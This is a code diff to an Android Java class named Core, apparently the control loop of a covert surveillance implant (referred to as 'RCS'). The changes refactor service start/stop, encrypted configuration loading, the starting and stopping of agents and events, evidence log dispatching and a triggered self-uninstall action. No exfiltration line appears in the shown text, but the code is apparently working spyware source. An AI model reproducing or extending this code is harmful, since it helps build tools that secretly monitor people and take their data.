@@ -39,6 +39,7 @@ public class Core extends Activity implements Runnable {
 	/** The Constant SLEEPING_TIME. */
 	private static final int SLEEPING_TIME = 1000;
 	private static final String TAG = "Core"; //$NON-NLS-1$
+	private static boolean serviceRunning = false;
 
 	/** The b stop core. */
 	private boolean bStopCore = false;
@@ -47,7 +48,7 @@ public class Core extends Activity implements Runnable {
 	private Resources resources;
 
 	/** The core thread. */
-	private Thread coreThread;
+	private Thread coreThread = null;
 
 	/** The content resolver. */
 	private ContentResolver contentResolver;
@@ -58,10 +59,10 @@ public class Core extends Activity implements Runnable {
 	/** The event manager. */
 	private ManagerEvent eventManager;
 	private WakeLock wl;
-	//private long queueSemaphore;
+	// private long queueSemaphore;
 	private Thread fastQueueThread;
 	private CheckAction checkActionFast;
-
+	
 	/**
 	 * Start.
 	 * 
@@ -71,8 +72,18 @@ public class Core extends Activity implements Runnable {
 	 *            the cr
 	 * @return true, if successful
 	 */
+
 	public boolean Start(final Resources r, final ContentResolver cr) {
+		if (serviceRunning == true) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
+			}
+			
+			return false;
+		}
+		
 		coreThread = new Thread(this);
+
 		agentManager = ManagerAgent.self();
 		eventManager = ManagerEvent.self();
 
@@ -86,6 +97,10 @@ public class Core extends Activity implements Runnable {
 		try {
 			coreThread.start();
 		} catch (final Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(e);//$NON-NLS-1$
 			}
@@ -98,6 +113,8 @@ public class Core extends Activity implements Runnable {
 		wl.acquire();
 
 		Evidence.info(Messages.getString("30.1")); //$NON-NLS-1$
+		
+		serviceRunning = true;
 		return true;
 	}
 
@@ -108,14 +125,23 @@ public class Core extends Activity implements Runnable {
 	 */
 	public boolean Stop() {
 		bStopCore = true;
-		stopAll();
+		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " RCS Thread Stopped"); //$NON-NLS-1$
 		}
+		
 		wl.release();
+
+		coreThread=null;
+		
+		serviceRunning = false;
 		return true;
 	}
 
+	public static boolean isServiceRunning() {
+		return serviceRunning;
+	}
+	
 	// Runnable (main routine for RCS)
 	/*
 	 * (non-Javadoc)
@@ -128,44 +154,32 @@ public class Core extends Activity implements Runnable {
 		}
 
 		try {
-			while (!bStopCore) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: init task"); //$NON-NLS-1$
+			}
+
+			int confLoaded = taskInit();
+			// viene letta la conf e vengono fatti partire agenti e eventi
+			if (confLoaded == ConfType.Error) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Info: init task"); //$NON-NLS-1$
+					Check.log(TAG + " Error: TaskInit() FAILED"); //$NON-NLS-1$
 				}
 
-				int confLoaded = taskInit();
-				// viene letta la conf e vengono fatti partire agenti e eventi
-				if (confLoaded == ConfType.Error) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " Error: TaskInit() FAILED"); //$NON-NLS-1$
-					}
-					break;
-				} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " TaskInit() OK, configuration loaded: " + confLoaded); //$NON-NLS-1$
-					}
-				}
+			} else {
 
-				// Status.self().setRestarting(false);
 				if (Cfg.DEBUG) {
+					Check.log(TAG + " TaskInit() OK, configuration loaded: " + confLoaded); //$NON-NLS-1$
 					Check.log(TAG + " Info: starting checking actions"); //$NON-NLS-1$
 				}
 
-				if (checkActions() == Exit.RELOAD) { //$NON-NLS-1$
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " Info: Waiting a while before reloading"); //$NON-NLS-1$
-					}
-					// questa stopAll viene lanciata prima del prossimo taskInit
-					stopAll();
-					Utils.sleep(2000);
-				} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " Error: CheckActions() wants to exit"); //$NON-NLS-1$
-					}
-					// chiudere tutti i thread
-					break;
+				// Torna true in caso di UNINSTALL o false in caso di stop del servizio
+				checkActions();
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "CheckActions() wants to exit"); //$NON-NLS-1$
 				}
 			}
+
 			stopAll();
 		} catch (final Throwable ex) {
 			if (Cfg.DEBUG) {
@@ -175,6 +189,7 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " AndroidService exit "); //$NON-NLS-1$
 			}
+
 			Utils.sleep(1000);
 
 			System.runFinalizersOnExit(true);
@@ -183,7 +198,7 @@ public class Core extends Activity implements Runnable {
 		}
 	}
 
-	private synchronized Exit checkActions() {
+	private synchronized boolean checkActions() {
 
 		checkActionFast = new CheckAction(Action.FAST_QUEUE);
 
@@ -201,8 +216,9 @@ public class Core extends Activity implements Runnable {
 		CheckAction(int queue) {
 			this.queue = queue;
 		}
+
 		public void run() {
-			Exit ret = checkActions(queue);
+			boolean ret = checkActions(queue);
 		}
 	}
 
@@ -210,9 +226,9 @@ public class Core extends Activity implements Runnable {
 	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
 	 * bloccante.
 	 * 
-	 * @return true, if successful
+	 * @return true, if UNINSTALL
 	 */
-	private Exit checkActions(int qq) {
+	private boolean checkActions(int qq) {
 		final Status status = Status.self();
 
 		try {
@@ -220,13 +236,15 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " checkActions: " + qq); //$NON-NLS-1$
 				}
+
 				final Trigger[] actionIds = status.getTriggeredActions(qq);
 
-				if(actionIds.length == 0){
+				if (actionIds.length == 0) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkActions): triggered without actions: " + qq);
 					}
 				}
+
 				for (final Trigger trigger : actionIds) {
 					final Action action = status.getAction(trigger.getActionId());
 					final Exit exitValue = executeAction(action, trigger);
@@ -235,20 +253,15 @@ public class Core extends Activity implements Runnable {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " Info: checkActions: Uninstall"); //$NON-NLS-1$
 						}
+
 						UninstallAction.actualExecute();
 
-						return exitValue;
-					} else if (exitValue == Exit.RELOAD) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " checkActions: want Reload"); //$NON-NLS-1$
-						}
-
-						return exitValue;
+						return true;
 					}
 				}
 			}
 
-			return Exit.STOP;
+			return false;
 		} catch (final Throwable ex) {
 			// catching trowable should break the debugger ans log the full
 			// stack trace
@@ -256,40 +269,52 @@ public class Core extends Activity implements Runnable {
 				Check.log(ex);//$NON-NLS-1$
 				Check.log(TAG + " FATAL: checkActions error, restart: " + ex); //$NON-NLS-1$
 			}
-
-			return Exit.ERROR;
+			
+			return false;
 		}
 	}
 
-	private void stopAll() {
+	private synchronized void stopAll() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (stopAll)");
 		}
+
 		final Status status = Status.self();
+
 		// status.setRestarting(true);
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " Warn: " + "checkActions: reloading"); //$NON-NLS-1$ //$NON-NLS-2$
+			Check.log(TAG + " Warn: " + "checkActions: unTriggerAll"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
+
 		status.unTriggerAll();
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions: stopping agents"); //$NON-NLS-1$
 		}
+
 		agentManager.stopAll();
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions: stopping events"); //$NON-NLS-1$
 		}
+
 		eventManager.stopAll();
+
 		Utils.sleep(2000);
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions: untrigger all"); //$NON-NLS-1$
 		}
+
 		status.unTriggerAll();
 
 		final LogDispatcher logDispatcher = LogDispatcher.self();
+
 		if (!logDispatcher.isAlive()) {
 			logDispatcher.waitOnEmptyQueue();
 			logDispatcher.halt();
 		}
+
 	}
 
 	/**
@@ -309,20 +334,20 @@ public class Core extends Activity implements Runnable {
 
 			// Identify the device uniquely
 			final Device device = Device.self();
-			
+
 			int ret = loadConf();
-			
+
 			if (ret == 0) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error: Cannot load conf"); //$NON-NLS-1$
 				}
-				
+
 				return ConfType.Error;
 			}
 
 			// Start log dispatcher
 			final LogDispatcher logDispatcher = LogDispatcher.self();
-			
+
 			if (!logDispatcher.isAlive()) {
 				logDispatcher.start();
 			}
@@ -332,7 +357,7 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " eventManager FAILED"); //$NON-NLS-1$
 				}
-				
+
 				return ConfType.Error;
 			}
 
@@ -340,18 +365,17 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " Info: Events started"); //$NON-NLS-1$
 			}
 
-			/*if (agentManager.startAll() == false) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " agentManager FAILED"); //$NON-NLS-1$
-				}
-				
-				return ConfType.Error;
-			}*/
+			/*
+			 * if (agentManager.startAll() == false) { if (Cfg.DEBUG) {
+			 * Check.log(TAG + " agentManager FAILED"); //$NON-NLS-1$ }
+			 * 
+			 * return ConfType.Error; }
+			 */
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: Agents started"); //$NON-NLS-1$
 			}
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Core initialized"); //$NON-NLS-1$
 			}
@@ -359,11 +383,19 @@ public class Core extends Activity implements Runnable {
 			return ret;
 
 		} catch (final GeneralException rcse) {
+			if (Cfg.EXCEPTION) {
+				Check.log(rcse);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(rcse);//$NON-NLS-1$
 				Check.log(TAG + " RCSException() detected"); //$NON-NLS-1$
 			}
 		} catch (final Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(e);//$NON-NLS-1$
 				Check.log(TAG + " Exception() detected"); //$NON-NLS-1$
@@ -376,7 +408,7 @@ public class Core extends Activity implements Runnable {
 	public boolean verifyNewConf() {
 		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
 		boolean loaded = false;
-		
+
 		if (file.exists()) {
 			loaded = loadConfFile(file, false);
 		}
@@ -415,10 +447,10 @@ public class Core extends Activity implements Runnable {
 		// get the actual configuration
 		if (!loaded) {
 			file = new AutoFile(Path.conf() + ConfType.ActualConf);
-			
+
 			if (file.exists()) {
 				loaded = loadConfFile(file, true);
-				
+
 				if (!loaded) {
 					Evidence.info(Messages.getString("30.4")); //$NON-NLS-1$
 				} else {
@@ -430,7 +462,7 @@ public class Core extends Activity implements Runnable {
 		// tries to load the resource conf
 		if (!loaded) {
 			// Open conf from resources and load it into resource
-			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config),0); // config.bin
+			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 0); // config.bin
 
 			// Initialize the configuration object
 			final Configuration conf = new Configuration(resource);
@@ -456,23 +488,27 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (loadConfFile): " + file);
 			}
-			
+
 			final byte[] resource = file.read(8);
 			// Initialize the configuration object
 			Configuration conf = new Configuration(resource);
 			// Load the configuration
 			loaded = conf.loadConfiguration(instantiate);
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: Conf file loaded: " + loaded); //$NON-NLS-1$
 			}
 
 		} catch (GeneralException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (loadConfFile) Error: " + e);
+				Check.log(e);
 			}
 		}
-		
+
 		return loaded;
 	}
 
@@ -481,7 +517,7 @@ public class Core extends Activity implements Runnable {
 	 * 
 	 * @param action
 	 *            the action
-	 * @param baseEvent 
+	 * @param baseEvent
 	 * @return the int
 	 */
 	private Exit executeAction(final Action action, Trigger trigger) {
@@ -490,17 +526,20 @@ public class Core extends Activity implements Runnable {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " CheckActions() triggered: " + action); //$NON-NLS-1$
 		}
+
 		final Status status = Status.self();
 		status.unTriggerAction(action);
 
 		status.synced = false;
 
 		final int ssize = action.getSubActionsNum();
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions, " + ssize + " subactions"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		int i = 1;
+
 		for (final SubAction subAction : action.getSubActions()) {
 			try {
 
@@ -521,20 +560,9 @@ public class Core extends Activity implements Runnable {
 						Check.log(TAG + " Warn: (CheckActions): uninstalling"); //$NON-NLS-1$
 					}
 
-					//UninstallAction.actualExecute();
+					// UninstallAction.actualExecute();
 
 					exit = Exit.UNINSTALL;
-					break;
-
-				}
-
-				if (status.reload) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (CheckActions): reloading"); //$NON-NLS-1$
-					}
-
-					exit = Exit.RELOAD;
-					status.reload = false;
 					break;
 				}
 
@@ -546,6 +574,10 @@ public class Core extends Activity implements Runnable {
 					continue;
 				}
 			} catch (final Exception ex) {
+				if (Cfg.EXCEPTION) {
+					Check.log(ex);
+				}
+
 				if (Cfg.DEBUG) {
 					Check.log(ex);
 					Check.log(TAG + " Error: checkActions for: " + ex); //$NON-NLS-1$
@@ -579,18 +611,22 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (reloadConf): valid conf");
 			}
+			
 			stopAll();
+
 			int ret = taskInit();
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (reloadConf): END");
 			}
+
 			return ret != ConfType.Error;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (reloadConf): invalid conf");
 			}
+
 			return false;
 		}
 	}
-
 }
